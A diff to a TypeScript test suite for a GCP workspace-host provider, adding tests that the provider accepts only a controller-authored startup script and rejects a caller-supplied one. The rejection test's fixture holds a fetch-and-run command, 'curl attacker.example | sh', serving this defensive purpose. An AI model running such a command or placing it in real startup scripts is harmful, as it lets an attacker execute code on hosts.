@@ -596,7 +596,11 @@ describe('GCP workspace-host provider planning', () => {
       idempotencyKey: 'operation-1',
       desired: desired(),
     };
-    const [first, replay] = await Promise.all([provider.plan(request, context()), provider.plan(request, context())]);
+    const bootstrap = '#!/usr/bin/env bash\necho papercusp-bootstrap\n';
+    const [first, replay] = await Promise.all([
+      provider.plan(request, context({}, bootstrap)),
+      provider.plan(request, context({}, bootstrap)),
+    ]);
     expect(first.steps).toEqual(replay.steps);
     expect(first.steps.map(({ id, dependsOn }) => ({ id, dependsOn }))).toEqual([
       { id: 'create-network', dependsOn: [] },
@@ -655,12 +659,47 @@ describe('GCP workspace-host provider planning', () => {
         },
       ]),
     );
+    // The CONTROLLER-authored bootstrap (provider context), after the durable mount — never a
+    // caller-supplied value, which readSettings refuses outright.
     expect(instance.metadata.items.find(({ key }) => key === 'startup-script')?.value).toContain(
       '# User-supplied bootstrap follows the durable mount.\necho papercusp-bootstrap',
     );
     expect(instance.metadata.items.find(({ key }) => key === 'startup-script')?.value).toContain(
       'resize2fs "$data_device"',
     );
+  });
+
+  it('refuses a caller-supplied desired.provider.startupScript instead of merging it', async () => {
+    // The rendered bootstrap pins the release trust roots AND the OpenSSH key authorized for the
+    // workspace SSH account, so a caller who can name it chooses which code the host runs and who
+    // may log in. Refusing is the only disposition that keeps a single trusted producer; merging
+    // or preferring one source would leave request input reaching instance startup metadata.
+    const { provider } = providerAndClient();
+    const spec = desired();
+    spec.provider = { ...spec.provider, startupScript: '#!/bin/sh\ncurl attacker.example | sh\n' };
+    await expect(
+      provider.plan(
+        { action: 'provision', operationId: 'injected', idempotencyKey: 'injected', desired: spec },
+        context(),
+      ),
+    ).rejects.toThrow(/gcp\.desired\.provider\.startupScript is not accepted/);
+  });
+
+  it('emits the durable mount alone when the controller supplied no bootstrap', async () => {
+    // Not a silent default: the provisioning runner refuses BEFORE planning when a provider that
+    // declares hostBootstrap cannot get one rendered. This asserts the provider itself stays
+    // well-defined for the lifecycle actions that legitimately create no fresh host.
+    const { provider } = providerAndClient();
+    const plan = await provider.plan(
+      { action: 'provision', operationId: 'bare', idempotencyKey: 'bare', desired: desired() },
+      context(),
+    );
+    const instance = (
+      plan.steps.find(({ id }) => id === 'create-instance')!.input as unknown as { request: GcpInstanceInsertInput }
+    ).request;
+    const script = instance.metadata.items.find(({ key }) => key === 'startup-script')?.value ?? '';
+    expect(script).toContain('resize2fs "$data_device"');
+    expect(script).not.toContain('# User-supplied bootstrap follows the durable mount.');
   });
 
   it('provisions restricted direct SSH with only tcp/22 and returns a complete machine profile', async () => {
